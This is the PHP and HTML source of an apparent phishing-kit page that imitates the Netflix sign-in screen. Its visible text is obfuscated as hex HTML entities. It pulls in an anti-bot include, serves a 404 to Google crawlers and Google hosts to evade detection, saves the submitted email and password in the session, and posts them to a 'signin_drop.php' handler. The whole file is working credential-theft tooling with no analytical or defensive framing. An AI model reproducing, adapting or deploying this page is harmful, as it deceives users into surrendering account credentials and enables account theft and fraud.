<?php

        session_start();
        error_reporting(0);
        ########################################################
        ################ [+] INCLUDE FILES [+] #################
        ########################################################
        include('../functions/get_lang_en.php');
        include('../antibots/all_antibots.php');
        ########################################################
        ############# [+] SESSION INFORMATION [+] ##############
        ########################################################
        $_SESSION['_login_email_']    = $_POST['email'];
        $_SESSION['_login_password_'] = $_POST['password'];
        ########################################################
        ############### [+] HTTP_USER_AGENT [+] ################
        ########################################################
        if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        ########################################################
?>
<!doctype html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
      <meta charset="utf-8"/>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
      <title>&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
      <link type="text/css" rel="stylesheet" href="../lib/css/codex.login.css"/>
      <link type="text/css" rel="stylesheet" href="../lib/css/signin.css">
      <link rel="shortcut icon" href="../lib/img/nficon2016.ico"/>
      <link rel="apple-touch-icon" href="../lib/img/nficon2016.png"/>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
      <script type="text/javascript">
    $(document).ready(function(){
    $('#submit').on('click', function () {
      if ($('#id_email').val() != '' && $('#id_password').val() != '') {
        $('#Rotation').fadeIn(300);
      }  
    });
});  
      </script>
   </head>
   <body>
      <div id="Rotation">
         <p style="font-size: 13px;">&#x43;&#x68;&#x65;&#x63;&#x6B;&#x69;&#x6E;&#x67;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;&#x2E;&#x2E;</p>
      </div>
      <div id="appMountPoint">
         <div class="login-wrapper hybrid-login-wrapper">
            <div class="login-wrapper-background" style="background-image:url( &#x27;https://assets.nflxext.com/ffe/siteui/vlv3/bd27b60f-02db-41da-8f5c-1558b01b44d0/17a20159-6c8b-4e60-be30-becbc0268684/DZ-en-20180813-popsignuptwoweeks-perspective_alpha_website_large.jpg&#x27; );" data-reactid="2"></div>
            <div class="nfHeader login-header signupBasicHeader">
               <a href="/" class="svg-nfLogo signupBasicHeader">
                  <svg class="svg-icon svg-icon-netflix-logo " xmlns="http://www.w3.org/2000/svg" width="1024" height="276.742" viewBox="0 0 1024 276.742">
                     <path d="M140.803 258.904c-15.404 2.705-31.079 3.516-47.294 5.676l-49.458-144.856v151.073c-15.404 1.621-29.457 3.783-44.051 5.945v-276.742h41.08l56.212 157.021v-157.021h43.511v258.904zm85.131-157.558c16.757 0 42.431-.811 57.835-.811v43.24c-19.189 0-41.619 0-57.835.811v64.322c25.405-1.621 50.809-3.785 76.482-4.596v41.617l-119.724 9.461v-255.39h119.724v43.241h-76.482v58.105zm237.284-58.104h-44.862v198.908c-14.594 0-29.188 0-43.239.539v-199.447h-44.862v-43.242h132.965l-.002 43.242zm70.266 55.132h59.187v43.24h-59.187v98.104h-42.433v-239.718h120.808v43.241h-78.375v55.133zm148.641 103.507c24.594.539 49.456 2.434 73.51 3.783v42.701c-38.646-2.434-77.293-4.863-116.75-5.676v-242.689h43.24v201.881zm109.994 49.457c13.783.812 28.377 1.623 42.43 3.242v-254.58h-42.43v251.338zm231.881-251.338l-54.863 131.615 54.863 145.127c-16.217-2.162-32.432-5.135-48.648-7.838l-31.078-79.994-31.617 73.51c-15.678-2.705-30.812-3.516-46.484-5.678l55.672-126.75-50.269-129.992h46.482l28.377 72.699 30.27-72.699h47.295z" fill="#d81f26"/>
                  </svg>
               </a>
            </div>
            <div class="login-body">
               <div>
                  <div class="login-content login-form hybrid-login-form hybrid-login-form-signup">
                     <div class="hybrid-login-form-main">
                        <h1>&#x53;&#x69;&#x67;&#x6E;&#x20;&#x49;&#x6E;</h1>
                        <?php if (isset($_GET['error'])){ ?>
                        <div class="ui-message-container ui-message-error">
                           <div class="ui-message-icon"></div>
                           <div class="ui-message-contents"><b>&#x49;&#x6E;&#x63;&#x6F;&#x72;&#x72;&#x65;&#x63;&#x74;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x2E;</b> &#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x74;&#x72;&#x79;&#x20;&#x61;&#x67;&#x61;&#x69;&#x6E;&#x20;&#x6F;&#x72;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x63;&#x61;&#x6E; <a href="#">&#x72;&#x65;&#x73;&#x65;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</a>.</div>
                        </div>
                        <?php } ?>
                        <form method="post" action="signin_drop.php" id="form" class="idform">
                           <div class="nfInput nfPasswordInput login-input login-input-password">
                              <div class="nfInputPlacement" >
                                 <div class="nfPasswordControls" >
                                    <input required="" 
                                       name="email" 
                                       id="id_email" 
                                       type="text" 
                                       class="nfTextField" 
                                       autocomplete="off"
                                       placeholder="&#x45;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x6F;&#x72;&#x20;&#x70;&#x68;&#x6F;&#x6E;&#x65;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;" 
                                       oninvalid="this.setCustomValidity('&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x65;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x6F;&#x72;&#x20;&#x70;&#x68;&#x6F;&#x6E;&#x65;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x2E;')"
                                       oninput="setCustomValidity('')" 
                                       />
                                 </div>
                              </div>
                           </div>
                           <div class="nfInput nfPasswordInput login-input login-input-password" >
                              <div class="nfInputPlacement">
                                 <div class="nfPasswordControls">
                                    <input required="" 
                                    type="password" 
                                    name="password" 
                                    autocomplete="off"
                                    class="nfTextField" 
                                    id="id_password" 
                                    placeholder="&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;" 
                                    oninvalid="this.setCustomValidity('&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x2E;')"
                                    oninput="setCustomValidity('')" 
                                    />
                                    <button id="id_password_toggle" type="button" class="nfPasswordToggle" title="&#x53;&#x68;&#x6F;&#x77;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;">&#x53;&#x48;&#x4F;&#x57;</button>
                                 </div>
                              </div>
                           </div>
                           <button class="btn login-button btn-submit btn-small" id="submit" type="submit">&#x53;&#x69;&#x67;&#x6E;&#x20;&#x49;&#x6E;</button>
                           <div class="hybrid-login-form-help">
                              <div class="ui-binary-input login-remember-me">
                                 <input type="checkbox" class="" name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="0" checked="" /><label for="bxid_rememberMe_true"><span class="login-remember-me-label-text">&#x52;&#x65;&#x6D;&#x65;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x6D;&#x65;</span></label>
                                 <div class="helper"></div>
                              </div>
                              <a href="#LoginHelp" class="login-help-link">&#x4E;&#x65;&#x65;&#x64;&#x20;&#x68;&#x65;&#x6C;&#x70;&#x3F;</a>
                           </div>
                        </form>
                     </div>
                     <div class="hybrid-login-form-other">
                        <form method="post" class="login-form">
                           <div class="facebookForm regOption">
                              <div class="fb-minimal">
                                 <hr data-reactid="1024"/>
                                 <button class="btn minimal-login btn-submit btn-small" type="submit" autocomplete="off">
                                    <div class="fb-login"><img class="icon-facebook" src="https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__blue_57.png"/><span class="fbBtnText" data-reactid="1028">&#x4C;&#x6F;&#x67;&#x69;&#x6E;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x46;&#x61;&#x63;&#x65;&#x62;&#x6F;&#x6F;&#x6B;</span></div>
                                 </button>
                              </div>
                           </div>
                        </form>
                        <div class="login-signup-now">&#x4E;&#x65;&#x77;&#x20;&#x74;&#x6F;&#x20;&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;&#x3F;<a class=" " target="_self" href="#">&#x53;&#x69;&#x67;&#x6E;&#x20;&#x75;&#x70;&#x20;&#x6E;&#x6F;&#x77;</a>.</div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="site-footer-wrapper login-footer">
               <div class="footer-divider"></div>
               <div class="site-footer">
                  <p class="footer-top"><a class="footer-top-a" href="#contactus">&#x51;&#x75;&#x65;&#x73;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x3F;&#x20;&#x43;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74;&#x20;&#x75;&#x73;&#x2E;</a></p>
                  <ul class="footer-links structural">
                     <li class="footer-link-item" placeholder="footer_responsive_link_gift_card_terms_item" ><a class="footer-link" href="#giftterms" placeholder="footer_responsive_link_gift_card_terms"><span id="">&#x47;&#x69;&#x66;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x54;&#x65;&#x72;&#x6D;&#x73;</span></a></li>
                     <li class="footer-link-item" placeholder="footer_responsive_link_terms_item" data-reactid="1052"><a class="footer-link" href="#termsofuse" placeholder="footer_responsive_link_terms"><span id="">&#x54;&#x65;&#x72;&#x6D;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x55;&#x73;&#x65;</span></a></li>
                     <li class="footer-link-item" placeholder="footer_responsive_link_privacy_item" data-reactid="1055"><a class="footer-link" href="#privacy" placeholder="footer_responsive_link_privacy"><span id="">&#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x53;&#x74;&#x61;&#x74;&#x65;&#x6D;&#x65;&#x6E;&#x74;</span></a></li>
                  </ul>
                  <div class="lang-selection-container" id="lang-switcher">
                     <div class="ui-select-wrapper" >
                        <label class="ui-label no-display"><span class="ui-label-text"></span></label>
                        <div class="select-arrow medium prefix globe">
                           <select class="ui-select medium" tabindex="0" placeholder="lang-switcher">
                              <option value="#login">&#x46;&#x72;&#x61;&#x6E;&#xE7;&#x61;&#x69;&#x73;</option>
                              <option selected="" value="#login">&#x45;&#x6E;&#x67;&#x6C;&#x69;&#x73;&#x68;</option>
                           </select>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div>
      </div>
      <script type="text/javascript" src="../lib/js/jquery.placeholder.label.js"></script> 
      <script type="text/javascript" src="../lib/js/jquery.bootstrap.js"></script>
      
      <script type="text/javascript">
         $(document).ready(function (){
            $('input[placeholder]').placeholderLabel();
         })
      </script>
   </body>
</html>